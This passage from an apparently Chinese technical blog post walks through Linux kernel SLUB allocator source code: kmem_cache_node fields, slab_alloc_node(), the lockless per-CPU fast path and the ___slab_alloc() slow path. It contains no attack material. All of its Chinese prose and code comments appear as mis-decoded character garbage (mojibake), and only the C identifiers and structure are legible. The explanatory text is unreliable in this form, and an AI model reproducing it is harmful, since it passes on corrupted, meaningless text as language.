ğŸ˜„</p></blockquote><p>å› ä¸ºæœ¬æ–‡ä¸»è¦è®² slubï¼Œæ‰€ä»¥ä»…æˆªå– slub ç›¸å…³å­—æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>ï¼šä¿æŠ¤ partial å’Œ full é“¾è¡¨çš„é”</li><li><code>partial</code>ï¼špartial slab é“¾è¡¨ï¼Œè¿æ¥<strong>æœ‰ç€éƒ¨åˆ†ç©ºé—²å¯¹è±¡å‰©ä½™çš„ slab</strong></li><li><code>nr_partial</code>ï¼špartial slab çš„æ•°é‡</li><li><code>full</code>ï¼šfull slab é“¾è¡¨ï¼Œè¿æ¥<strong>ç©ºé—²å¯¹è±¡å®Œå…¨è€—å°½çš„ slab</strong>ï¼ˆæ³¨ï¼šè¯¥é“¾è¡¨åŸºæœ¬ä¸Šä¸å¸¸ç”¨ï¼‰</li><li><code>nr_slabs</code>ï¼šæ€»çš„ slab æ•°é‡</li><li><code>total_objects</code>ï¼šæ€»çš„å¯¹è±¡æ•°é‡</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1 id="0x02-å¯¹è±¡çš„åˆ†é…"><a href="#0x02-å¯¹è±¡çš„åˆ†é…" class="headerlink" title="0x02. å¯¹è±¡çš„åˆ†é…"></a>0x02. å¯¹è±¡çš„åˆ†é…</h1><h2 id="â€»-ä¸€ã€slab-alloc-node-ï¼šä»æŒ‡å®šçš„-kmem-cache-åˆ†é…-object"><a href="#â€»-ä¸€ã€slab-alloc-node-ï¼šä»æŒ‡å®šçš„-kmem-cache-åˆ†é…-object" class="headerlink" title="â€» ä¸€ã€slab_alloc_node()ï¼šä»æŒ‡å®šçš„ kmem_cache åˆ†é… object"></a>â€» ä¸€ã€slab_alloc_node()ï¼šä»æŒ‡å®šçš„ kmem_cache åˆ†é… object</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜åˆ†é…æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>slab_alloc_node()</code> å®Œæˆå†…å­˜åˆ†é…çš„å·¥ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å†…è”åŒ–çš„å¿«é€Ÿè·¯å¾„ä»¥è®©åˆ†é…å‡½æ•° (kmalloc, kmem_cache_alloc) ä¸­åŒ…å«å¿«é€Ÿè·¯å¾„.</span><br><span class="hljs-comment"> * å› æ­¤ï¼Œå¯¹äºå¿«é€Ÿè·¯å¾„å¯ä»¥æ»¡è¶³çš„è¯·æ±‚ï¼Œæ²¡æœ‰å‡½æ•°è°ƒç”¨çš„å¼€é”€.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„é¦–å…ˆæ£€æŸ¥æ— é”çš„ç©ºé—²é“¾è¡¨æ˜¯å¦å¯ä»¥è¢«ä½¿ç”¨.</span><br><span class="hljs-comment"> * è‹¥å¦ï¼Œè°ƒç”¨ __slab_alloc è¿›è¡Œç¼“æ…¢å¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä»æ— é”ç©ºé—²é“¾è¡¨å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ <code>slab_pre_alloc_hook()</code> è¿›è¡Œåˆ†é…å‰çš„æ£€æŸ¥å·¥ä½œï¼Œä¸é€šè¿‡åˆ™è¿”å› NULLï¼Œè¿™ä¸€æ­¥ä¸»è¦æ˜¯æ£€æŸ¥åˆ†é…æ ‡å¿—ä½æ˜¯å¦åˆæ³•ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>kfence_alloc()</code> è¿›è¡Œå†…å­˜é”™è¯¯æ£€æµ‹ï¼Œä¸é€šè¿‡åˆ™ç›´æ¥è·³è½¬åˆ° <code>out</code>ï¼Œè¿™é‡Œç”¨åˆ°äº† <em>Kfence (Kernel Electric Fence)</em>  å†…å­˜çº é”™æœºåˆ¶ï¼Œä¸»è¦æ˜¯æ£€æŸ¥å¯¹ <code>data page</code> çš„è®¿é—®æ˜¯å¦è¶Šç•Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>æ¥ä¸‹æ¥è°ƒç”¨ <code>__slab_alloc_node()</code> è¿›è¡Œæ­£å¼çš„å†…å­˜åˆ†é…ï¼Œè¿™ä¸€æ­¥ä¾¿æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ <code>maybe_wipe_obj_freeptr()</code> å°† object åŸæœ¬å­˜æ”¾ next free object æŒ‡é’ˆçš„ä½ç½®æ¸…é›¶ï¼Œä¹‹åè°ƒç”¨ <code>slab_want_init_on_alloc()</code> æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦æœ‰ <code>__GFP_ZERO</code>ï¼Œè‹¥æœ‰åˆ™è°ƒç”¨ <code>slab_post_alloc_hook()</code> å°† object ä¸Šæ•°æ®æ¸…é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“ init == &#x27;true&#x27;, ç±»ä¼¼ kzalloc() æ—, </span><br><span class="hljs-comment"> * ä»…æœ‰ @orig_size å­—èŠ‚ä¼šè¢«æ¸…é›¶ï¼Œè€Œé s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•° <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-ï¼šä»-percpu-freelist-è¿›è¡Œåˆ†é…ï¼ˆfast-pathï¼‰"><a href="#I-slab-alloc-node-ï¼šä»-percpu-freelist-è¿›è¡Œåˆ†é…ï¼ˆfast-pathï¼‰" class="headerlink" title="I. __slab_alloc_node()ï¼šä» percpu freelist è¿›è¡Œåˆ†é…ï¼ˆfast pathï¼‰"></a>I. __slab_alloc_node()ï¼šä» percpu freelist è¿›è¡Œåˆ†é…ï¼ˆfast pathï¼‰</h3><p>è¯¥å‡½æ•°é¦–å…ˆä¼šå…ˆè·å– percpu çš„ <code>kmem_cache_cpu</code> ä¸Šçš„ freelist ä¸ slabï¼Œ<strong>è‹¥ slab æˆ– freelist ä¸ºç©º</strong> &#x2F; slab ä¸ node ä¸åŒ¹é…ï¼Œåˆ™è°ƒç”¨ <code>__slab_alloc()</code> åˆ†é…ä¸€å¼ æ–° slab å¹¶ä»å…¶ä¸­è·å–ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¿…é¡»é€šè¿‡è¯¥ cpu ptr è¯»å– kmem_cache cpu æ•°æ®. æŠ¢å æ˜¯å¼€å¯çš„.</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½ä¼šåœ¨ä»ä¸€ä¸ª cpu åŒºåŸŸè¯»å–æ—¶åœ¨ cpu é—´åˆ‡æ¢.</span><br><span class="hljs-comment"> * åªè¦æˆ‘ä»¬åœ¨ cmpxchg æ—¶åœ¨åŸæœ¬çš„ cpu ä¸Šé‡æ–°ç»“æŸä¾¿ä¸è¦ç´§.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¿…é¡»ä¿è¯ tid ä¸ kmem_cache_cpu è¢«åœ¨åŒä¸€ cpu ä¸Šå–å›.</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆè¯»å– kmem_cache_cpu æŒ‡é’ˆå¹¶ç”¨å…¶è¯»å– tid.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸¤æ¬¡è¯»å–é—´è¢«æŠ¢å å¹¶åˆ‡æ¢åˆ°å¦ä¸€ cpuï¼Œç”±äºè¿™ä¸¤è€…ä»ä¸åŒä¸€ cpu å…³è”ï¼Œ</span><br><span class="hljs-comment"> * cmpxchg ç¨åå°†ä¼šéªŒè¯ cpu ï¼Œè¿™æ˜¯ OK çš„.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ­¤å¤„ä½¿ç”¨çš„æ— ä¸­æ–­ï¼ˆirqlessï¼‰ å¯¹è±¡åˆ†é…/é‡Šæ”¾ç®—æ³•å†³å®šäºè·å– cpu_slab æ•°æ®çš„é¡ºåº.</span><br><span class="hljs-comment"> * tid åº”å½“åœ¨åœ¨ c ä¸Šçš„ä»»ä½•äº‹ä¹‹å‰è¢«è·å–ä»¥ç¡®ä¿ä¸æ­¤å‰ tid å…³è”çš„å¯¹è±¡ä¸ slab</span><br><span class="hljs-comment"> * ä¸ä¼šè¢«ä¸å½“å‰ tid ä¸€èµ·ä½¿ç”¨. è‹¥æˆ‘ä»¬å…ˆè·å– tidï¼Œå¯¹è±¡ä¸ slab å¯èƒ½ä¼šä¸ä¸‹ä¸€ä¸ª tid </span><br><span class="hljs-comment"> * ç›¸å…³è”ï¼Œè€Œæˆ‘ä»¬çš„åˆ†é…/é‡Šæ”¾è¯·æ±‚ä¹Ÿå°†ä¼šå¤±è´¥.è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé‡è¯•æ‰€ä»¥æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queueï¼ˆè¿™å¥ç¿»æˆä¸­æ–‡å’‹éƒ½ä¸é¡ºï¼Œç›´æ¥çœ‹åŸæ–‡å§ğŸ˜„ï¼‰.</span><br><span class="hljs-comment"> * ç”±æ­¤å¯ä»¥ç¡®ä¿ cmpxchg_double å‘ç”Ÿåœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šä¸”å…¶é—´åœ¨é“¾è¡¨ä¸Šæ²¡æœ‰ä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>è‹¥æœ‰ freelist &amp; slubï¼Œåˆ™<strong>è°ƒç”¨ <code>get_freepointer_safe()</code> è·å–å½“å‰ç©ºé—²å¯¹è±¡ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡</strong>ï¼›æ¥ä¸‹æ¥ <code>this_cpu_cmpxchg_double()</code> ä¼šæ£€æŸ¥æ˜¯å¦ <code>freelist == object</code>ã€<code>cpu_slab-&gt;tid == tid</code>ï¼Œè‹¥æ˜¯åˆ™<strong>å°† freelist è®¾ä¸º next_object å¹¶è·å–è®¾ç½®ä¸‹ä¸€ tid</strong>ï¼Œå¦åˆ™è¯´æ˜å‘ç”Ÿäº†æŠ¢å ï¼ˆæˆ‘ä»¬å·²ç»ä¸åœ¨åŸ cpu ä¸Šäº†ï¼‰ï¼Œè·³è½¬å› <code>redo</code> é‡æ–°åœ¨å½“å‰ cpu ä¸Šè¿›è¡Œåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»…å½“æ²¡æœ‰é¢å¤–æ“ä½œä¸”æˆ‘ä»¬åœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šæ—¶ cmpxchg å°†åŒ¹é….</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg åŸå­åœ°è¿›è¡Œäº†å¦‚ä¸‹ï¼š (æ²¡æœ‰é”è¯­ä¹‰!)</span><br><span class="hljs-comment"> * 1. é‡å®šä½ç¬¬ä¸€ä¸ªæŒ‡é’ˆåˆ°å½“å‰çš„ per cpu åŒºåŸŸ.</span><br><span class="hljs-comment"> * 2. éªŒè¯ tid &amp; freelist æ²¡æœ‰è¢«æ”¹å˜</span><br><span class="hljs-comment"> * 3. è‹¥æœªè¢«æ”¹å˜ï¼Œæ›¿æ¢ tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‡ªä»æ²¡æœ‰é”è¯­ä¹‰ï¼Œä¿æŠ¤ä»…éœ€è¦å¯¹æŠ—åœ¨è¯¥ cpu ä¸Šæ‰§è¡Œçš„ä»£ç *ä¸*ä»å…¶ä»–çš„ cpu ä¸Šè®¿é—®.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹äºç›´æ¥ä» cpu_slab ä¸Šåˆ†é…çš„å¯¹è±¡ä¼šé€šè¿‡ <code>prefetch_freepointer()</code> è°ƒç”¨ prefetchw æŒ‡ä»¤æå‰å°†å·²åˆ†é…å¯¹è±¡çš„åœ°å€è½½å…¥ç¼“å­˜ä¸­ï¼Œä¹‹åå°±æ˜¯è¿”å›åˆ†é…æˆåŠŸçš„ç©ºé—²å¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-ï¼šè·å–å¦ä¸€-slab-è¿›è¡Œåˆ†é…ï¼ˆslow-pathï¼‰"><a href="#II-slab-alloc-ï¼šè·å–å¦ä¸€-slab-è¿›è¡Œåˆ†é…ï¼ˆslow-pathï¼‰" class="headerlink" title="II. ___slab_alloc()ï¼šè·å–å¦ä¸€ slab è¿›è¡Œåˆ†é…ï¼ˆslow pathï¼‰"></a>II. ___slab_alloc()ï¼šè·å–å¦ä¸€ slab è¿›è¡Œåˆ†é…ï¼ˆslow pathï¼‰</h3><p><code>__slab_alloc()</code> å…¶å®æ˜¯åœ¨å¼€å¯äº†æŠ¢å çš„æƒ…å†µä¸‹ï¼ˆé»˜è®¤å¼€å¯ï¼‰å¯¹ <code>___slab_alloc()</code> çš„ä¸€ä¸ªç®€å•çš„ wrapperï¼Œä¸»è¦å°±æ˜¯é‡æ–°è¯»å– <code>kmem_cache_cpu</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“æŠ¢å æ²¡æœ‰å…³é—­æ—¶ ___slab_alloc() ç”¨äºä¸Šä¸‹æ–‡çš„ wrapper.</span><br><span class="hljs-comment"> * é€šè¿‡é‡æ–°è·å– percpu åŒºåŸŸçš„æŒ‡é’ˆæ¥è¡¥å¿å¯èƒ½çš„ cpu æ›´æ”¹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½å·²è¢«æŠ¢å ä¸”åœ¨å…³é—­æŠ¢å å‰è°ƒåº¦åˆ°äº†ä¸åŒçš„ cpu ä¸Š.</span><br><span class="hljs-comment"> * éœ€è¦é‡æ–°è½½å…¥ cpu åŒºåŸŸæŒ‡é’ˆ.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>___slab_alloc()</code>ï¼Œè¯¥å‡½æ•°ä¾¿æ˜¯æ…¢é€Ÿåˆ†é…è·¯å¾„çš„æ ¸å¿ƒå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ…¢é€Ÿè·¯å¾„. æ— é” freelist ä¸ºç©ºæˆ–æ˜¯æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ä»»åŠ¡.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æ–°çš„å¯¹è±¡å·²ç»è¢«é‡Šæ”¾åˆ°å¸¸è§„çš„ freelist ä¸Šï¼Œåˆ™è¿‡ç¨‹ä»æ˜¯å¾ˆå¿«çš„.</span><br><span class="hljs-comment"> * è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ç®€å•åœ°è®©å¸¸è§„çš„ freelist å–ä»£æ— é” freelist</span><br><span class="hljs-comment"> * å¹¶ zap the regular freelist.ï¼ˆzapæƒ³ä¸å‡ºå’‹ç¿»è¯‘å¥½ğŸ˜„ï¼‰</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿™ä¸èµ·ä½œç”¨ï¼Œåˆ™æˆ‘ä»¬å›é€€åˆ° partial é“¾è¡¨. æˆ‘ä»¬å°† freelist ä¸Šçš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br><span class="hljs-comment"> * ä½œä¸ºè¦åˆ†é…çš„å¯¹è±¡å¹¶å°† freelist çš„å‰©ä½™éƒ¨åˆ†ç§»åŠ¨åˆ°æ— é” freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬æ— æ³•ä» partial slab é“¾è¡¨ä¸Šè·å¾—ä¸€ä¸ªæ–°çš„ slabï¼Œæˆ‘ä»¬éœ€è¦åˆ†é…ä¸€ä¸ªæ–°çš„ slab.</span><br><span class="hljs-comment"> * å› ä¸ºè¿™åŒ…å«å¯¹é¡µåˆ†é…å™¨çš„è°ƒç”¨ä¸æ–° slab çš„è®¾ç½®ï¼Œè¿™æ˜¯æœ€æ…¢çš„è·¯å¾„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“æˆ‘ä»¬çŸ¥é“æŠ¢å è¢«ç¦ç”¨æ—¶æ‰€ç”¨çš„ __slab_alloc çš„ç‰ˆæœ¬ (ä¹Ÿæ˜¯é€ æˆå¤§é‡åˆ†é…çš„åŸå› ).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¬”è€…æŒ‰ç…§ä»£ç æ ‡ç­¾é¡ºåºè¿›è¡Œåˆ†æ</p><h4 id="â‘ -reread-slabï¼šè¯»å–-percpu-slab"><a href="#â‘ -reread-slabï¼šè¯»å–-percpu-slab" class="headerlink" title="â‘  reread_slabï¼šè¯»å– percpu slab"></a>â‘  reread_slabï¼šè¯»å– percpu slab</h4><p>é¦–å…ˆè¯»å– percpu çš„ slabï¼Œè‹¥æ²¡æœ‰ slab åˆ™åˆ¤æ–­åˆ†é…èŠ‚ç‚¹ï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slabï¼Œæ³¨æ„è¿™ä¸€å—ä»£ç å¯¹åº” <code>reread_slab</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td 